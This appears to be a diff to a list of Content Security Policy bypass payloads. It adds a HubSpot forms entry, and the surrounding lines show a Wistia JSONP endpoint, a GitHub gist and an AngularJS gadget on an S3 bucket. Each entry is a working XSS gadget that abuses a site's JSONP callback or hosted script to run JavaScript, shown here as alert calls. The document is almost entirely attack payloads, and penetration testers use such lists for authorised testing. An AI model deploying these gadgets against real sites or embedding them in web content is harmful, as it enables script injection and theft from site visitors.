@@ -41,6 +41,7 @@ dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	
 eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>	renniepak
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>	renniepak
+forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>	renniepak
 geo.moatads.com	<script src="https://geo.moatads.com/n.js?callback=alert(document.domain)"></script>	renniepak
 gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>	renniepak
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>	renniepak
